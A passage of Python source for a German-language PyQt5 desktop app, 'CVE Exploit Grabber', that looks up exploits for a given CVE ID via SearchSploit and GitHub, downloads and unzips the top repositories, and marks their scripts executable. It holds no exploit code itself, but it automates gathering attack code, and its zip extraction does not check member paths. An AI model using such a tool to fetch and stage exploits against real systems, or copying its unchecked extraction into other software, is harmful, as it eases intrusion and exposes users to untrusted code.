            QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
            QLineEdit, QPushButton, QLabel, QTextEdit, QProgressBar,
            QMessageBox, QGroupBox, QCheckBox, QFileDialog, QFrame
        )
        from PyQt5.QtCore import QThread, pyqtSignal, Qt, QTimer
        from PyQt5.QtGui import QFont, QTextCursor, QPalette, QColor


        CVE_REGEX = re.compile(r'^CVE-\d{4}-\d{4,}$', re.IGNORECASE)
        GITHUB_API = "https://api.github.com/search/repositories"

        class ExploitWorker(QThread):
            log      = pyqtSignal(str)
            progress = pyqtSignal(int)
            status   = pyqtSignal(str)
            finished = pyqtSignal(bool, str)   # (erfolg, nachricht)

            def __init__(self, cve, out_dir, use_ssploit, use_gh):
                super().__init__()
                self.cve          = cve.upper().strip()
                self.out_dir      = out_dir
                self.use_ssploit  = use_ssploit
                self.use_gh       = use_gh
                self._running     = True

            def stop(self):
                self._running = False

            def run(self):
                try:
                    if not CVE_REGEX.match(self.cve):
                        self.finished.emit(False, "Ungültiges CVE-Format – CVE-YYYY-XXXXX erwartet")
                        return

                    exploit_dir = os.path.join(self.out_dir, self.cve)
                    os.makedirs(exploit_dir, exist_ok=True)
                    self.log.emit(f"[+] Zielordner: {exploit_dir}")

                    gefunden = False

                    if self.use_ssploit and self._running:
                        gefunden |= self._searchsploit(exploit_dir)

                    if self.use_gh and self._running:
                        gefunden |= self._github(exploit_dir)

                    if gefunden:
                        self.log.emit(f"\n[+] Fertig – Exploits in: {exploit_dir}")
                        self.finished.emit(True, exploit_dir)
                    else:
                        self.log.emit("\n[-] Keine Exploits gefunden.")
                        self.finished.emit(False, "Keine Ergebnisse")

                except Exception as e:
                    self.log.emit(f"\n[!] Fehler: {e}")
                    self.finished.emit(False, str(e))

            def _searchsploit(self, exploit_dir):
                self.log.emit("[*] SearchSploit wird durchsucht …")
                self.status.emit("SearchSploit läuft …")

                if not shutil.which("searchsploit"):
                    self.log.emit("    [!] searchsploit nicht installiert – überspringe")
                    self.log.emit("    [i] Installieren: sudo apt install exploitdb")
                    return False

                try:
                    r = subprocess.run(
                        ["searchsploit", "--cve", self.cve, "-j"],
                        capture_output=True, text=True, timeout=90
                    )
                    if r.returncode != 0:
                        self.log.emit(f"    [!] Fehler: {r.stderr.strip()}")
                        return False

                    data = json.loads(r.stdout)
                    results = data.get("RESULTS_EXPLOIT", [])
                    if not results:
                        self.log.emit("    [-] Keine Treffer")
                        return False

                    self.log.emit(f"    [+] {len(results)} Exploit(s):")
                    for idx, e in enumerate(results, 1):
                        if not self._running:
                            return False
                        title   = e.get("Title", "?")
                        src     = e.get("Path", "")
                        self.log.emit(f"    {idx}. {title}")
                        self.progress.emit(int((idx / len(results)) * 40))

                        if src and os.path.isfile(src):
                            dst = os.path.join(exploit_dir, os.path.basename(src))
                            shutil.copy2(src, dst)
                            os.chmod(dst, 0o755)          # ausführbar machen
                            self.log.emit(f"       -> {os.path.basename(src)}")
                        else:
                            self.log.emit(f"       [!] Datei fehlt: {src}")
                    return True

                except subprocess.TimeoutExpired:
                    self.log.emit("    [!] Zeitüberschreitung")
                except json.JSONDecodeError:
                    self.log.emit("    [!] JSON-Fehler")
                return False

            def _github(self, exploit_dir):
                self.log.emit("[*] GitHub wird durchsucht …")
                self.status.emit("GitHub-Suche läuft …")

                headers = {
                    "Accept": "application/vnd.github.v3+json",
                    "User-Agent": "CVE-Grabber/1.0"
                }

                try:
                    url = f"{GITHUB_API}?q={quote(self.cve + ' exploit')}&sort=stars&per_page=8"
                    resp = requests.get(url, headers=headers, timeout=30)

                    if resp.status_code != 200:
                        self.log.emit(f"    [!] GitHub API {resp.status_code}")
                        # Rate-Limit-Hinweis
                        if resp.status_code == 403:
                            self.log.emit("    [i] Rate-Limit erreicht – ohne Token max. 60/h")
                        return False

                    repos = resp.json().get("items", [])
                    if not repos:
                        self.log.emit("    [-] Keine Repos gefunden")
                        return False

                    self.log.emit(f"    [+] {len(repos)} Repo(s) – lade Top-5 …")
                    for idx, repo in enumerate(repos[:5], 1):
                        if not self._running:
                            return False

                        name   = repo["full_name"]
                        stars  = repo["stargazers_count"]
                        desc   = (repo.get("description") or "")[:90]
                        branch = repo.get("default_branch", "main")

                        self.log.emit(f"    {idx}. {name} ({stars} ★)")
                        if desc:
                            self.log.emit(f"       {desc}")
                        self.progress.emit(40 + int((idx / 5) * 50))

                        # ZIP des gesamten Repos herunterladen
                        zip_url = f"https://github.com/{name}/archive/refs/heads/{branch}.zip"
                        try:
                            zresp = requests.get(zip_url, timeout=60)
                            if zresp.status_code != 200:
                                self.log.emit(f"       [!] Download fehlgeschlagen ({zresp.status_code})")
                                continue

                            repo_dir = os.path.join(exploit_dir, name.replace("/", "_"))
                            os.makedirs(repo_dir, exist_ok=True)

                            with zipfile.ZipFile(io.BytesIO(zresp.content)) as zf:
                                # GitHub packt alles in einen Ordner '<repo>-<branch>/'
                                members = zf.namelist()
                                prefix  = members[0].split("/")[0] + "/"
                                for m in members:
                                    rel = m[len(prefix):] if m.startswith(prefix) else m
                                    if not rel:
                                        continue
                                    dst = os.path.join(repo_dir, rel)
                                    if m.endswith("/"):
                                        os.makedirs(dst, exist_ok=True)
                                    else:
                                        os.makedirs(os.path.dirname(dst), exist_ok=True)
                                        with zf.open(m) as srcf, open(dst, "wb") as dstf:
                                            dstf.write(srcf.read())

                            # Skripte ausführbar machen
                            for root, _, files in os.walk(repo_dir):
                                for f in files:
                                    if f.endswith((".py", ".sh", ".pl", ".rb", ".php")):
                                        os.chmod(os.path.join(root, f), 0o755)

                            self.log.emit(f"       -> Heruntergeladen ✓")

                        except Exception as e:
                            self.log.emit(f"       [!] Fehler: {e}")

                    return True

                except requests.exceptions.Timeout:
                    self.log.emit("    [!] GitHub-Zeitüberschreitung")
                except requests.exceptions.RequestException as e:
                    self.log.emit(f"    [!] Netzwerkfehler: {e}")
                return False


        # ---------------------------------------------------------------------------
        # Hauptfenster
        # ---------------------------------------------------------------------------
        class MainWindow(QMainWindow):
            def __init__(self):
                super().__init__()
                self.worker = None
                self._build_ui()

            def _build_ui(self):
                self.setWindowTitle("CVE Exploit Grabber")
                self.setMinimumSize(820, 620)

                central = QWidget()
                self.setCentralWidget(central)
                vbox = QVBoxLayout(central)
                vbox.setSpacing(10)

                # ---- Eingabebereich ----
                grp_in = QGroupBox("CVE-ID eingeben")
                f_in   = QVBoxLayout(grp_in)

                row1 = QHBoxLayout()
                lbl_cve = QLabel("CVE-ID:")
                lbl_cve.setFont(QFont("Consolas", 11))
                self.entry_cve = QLineEdit()
                self.entry_cve.setFont(QFont("Consolas", 13))
                self.entry_cve.setPlaceholderText("z. B. CVE-2021-41773")
                self.entry_cve.returnPressed.connect(self._start)
                row1.addWidget(lbl_cve)
                row1.addWidget(self.entry_cve)
                f_in.addLayout(row1)

                row2 = QHBoxLayout()
                lbl_dir = QLabel("Zielordner:")
                self.entry_dir = QLineEdit()
                self.entry_dir.setFont(QFont("Consolas", 10))
                default_dir = os.path.join(os.path.expanduser("~"), "CVE_Exploits")
                self.entry_dir.setText(default_dir)
                btn_dir = QPushButton("…")
                btn_dir.setFixedWidth(36)
                btn_dir.clicked.connect(lambda: self._pick_dir())
                row2.addWidget(lbl_dir)
                row2.addWidget(self.entry_dir)
                row2.addWidget(btn_dir)
                f_in.addLayout(row2)

                row3 = QHBoxLayout()
                self.cb_ssploit = QCheckBox("SearchSploit (Kali)")
                self.cb_ssploit.setChecked(True)
                self.cb_github  = QCheckBox("GitHub PoCs")
                self.cb_github.setChecked(True)
                row3.addWidget(self.cb_ssploit)
                row3.addWidget(self.cb_github)
                row3.addStretch()
                f_in.addLayout(row3)

                vbox.addWidget(grp_in)

                # ---- Download-Button ----
                self.btn_dl = QPushButton("↓ Exploit herunterladen")
                self.btn_dl.setFont(QFont("Segoe UI", 12, QFont.Bold))
                self.btn_dl.setMinimumHeight(46)
                self.btn_dl.setStyleSheet("""
                    QPushButton {
                        background-color: #1a6d3c; color: white; border-radius: 6px; padding: 10px;
                    }
                    QPushButton:hover  { background-color: #238b4a; }
                    QPushButton:disabled { background-color: #555; }
                """)
                self.btn_dl.clicked.connect(self._start)
                vbox.addWidget(self.btn_dl, alignment=Qt.AlignCenter)

                # ---- Status / Progress ----
                self.lbl_status = QLabel("Bereit")
                self.lbl_status.setAlignment(Qt.AlignCenter)
                vbox.addWidget(self.lbl_status)

                self.progress = QProgressBar()
                self.progress.setVisible(False)
                vbox.addWidget(self.progress)

                # ---- Log-Ausgabe ----
                grp_log = QGroupBox("Ausgabe")
                f_log   = QVBoxLayout(grp_log)
                self.log = QTextEdit()
                self.log.setFont(QFont("Consolas", 10))
                self.log.setReadOnly(True)
                self.log.setStyleSheet("background-color: #1e1e1e; color: #d4d4d4;")
                f_log.addWidget(self.log)
                vbox.addWidget(grp_log, 1)   # nimmt Resthöhe

                # Statusleiste
                self.statusBar().showMessage("Bereit")

            def _pick_dir(self):
                p = QFileDialog.getExistingDirectory(self, "Zielordner")
                if p:
                    self.entry_dir.setText(p)

            def _append_log(self, msg):
                self.log.append(msg)
                c = self.log.textCursor()
                c.movePosition(QTextCursor.End)
                self.log.setTextCursor(c)

            def _start(self):
                cve = self.entry_cve.text().strip()
                if not cve:
                    QMessageBox.warning(self, "Eingabe", "Bitte CVE-ID eingeben.")
                    return
                if not CVE_REGEX.match(cve):
                    QMessageBox.warning(self, "Format", "CVE-YYYY-XXXXX erwartet\nz. B. CVE-2021-41773")
                    return

                out = self.entry_dir.text().strip() or default_dir

                # UI deaktivieren
                self.btn_dl.setEnabled(False)
                self.btn_dl.setText("⏳ Suche läuft …")
                self.entry_cve.setEnabled(False)
                self.progress.setVisible(True)
                self.progress.setValue(0)
                self.log.clear()
                self.lbl_status.setText("Starte …")

                self._append_log(f"[+] CVE: {cve.upper()}")
                self._append_log(f"[+] Zielordner: {out}")
                self._append_log(f"[+] SearchSploit: {self.cb_ssploit.isChecked()}")
                self._append_log(f"[+] GitHub: {self.cb_github.isChecked()}")
                self._append_log("─" * 60)

                self.worker = ExploitWorker(
                    cve, out,
                    self.cb_ssploit.isChecked(),
                    self.cb_github.isChecked()
                )
                self.worker.log.connect(self._append_log)
                self.worker.progress.connect(self.progress.setValue)
                self.worker.status.connect(self.lbl_status.setText)
                self.worker.finished.connect(self._on_done)
                self.worker.start()

            def _on_done(self, ok, msg):
                self.btn_dl.setEnabled(True)
                self.btn_dl.setText("↓ Exploit herunterladen")
                self.entry_cve.setEnabled(True)
                self.progress.setVisible(False)
                self.worker = None

                if ok:
                    self.lbl_status.setText("✅ Fertig")
                    self.statusBar().showMessage(f"Gespeichert: {msg}")
                    QMessageBox.information(self, "Erfolg",
                        f"Exploit(s) gespeichert unter:\n{msg}")
                else:
                    self.lbl_status.setText("❌ Fehlgeschlagen")
                    self.statusBar().showMessage("Keine Exploits gefunden")
                    QMessageBox.information(self, "Hinweis",
                        f"Keine Exploits für {self.entry_cve.text().strip().upper()} gefunden.\n\n"
                        "Tipps:\n"
                        "• SearchSploit: sudo apt install exploitdb\n"
                        "• GitHub ohne Token: max. 60 Anfragen/h\n"
                        "• CVE-ID auf Richtigkeit prüfen")

        def main():
            app = QApplication(sys.argv)
            app.setStyle("Fusion")

            # Dark-Theme-Palette
            p = QPalette()
            p.setColor(QPalette.Window,          QColor(48, 48, 48))
            p.setColor(QPalette.WindowText,      Qt.white)
            p.setColor(QPalette.Base,            QColor(35, 35, 35))
            p.setColor(QPalette.AlternateBase,   QColor(53, 53, 53))
            p.setColor(QPalette.Text,            Qt.white)
            p.setColor(QPalette.Button,          QColor(53, 53, 53))
            p.setColor(QPalette.ButtonText,      Qt.white)
            p.setColor(QPalette.Highlight,       QColor(42, 130, 218))
            p.setColor(QPalette.HighlightedText, Qt.black)
            app.setPalette(p)

            win = MainWindow()
            win.show()
            sys.exit(app.exec_())


        if __name__ == "__main__":
            main()

    case _:
        print("Type something valid next time! :)")
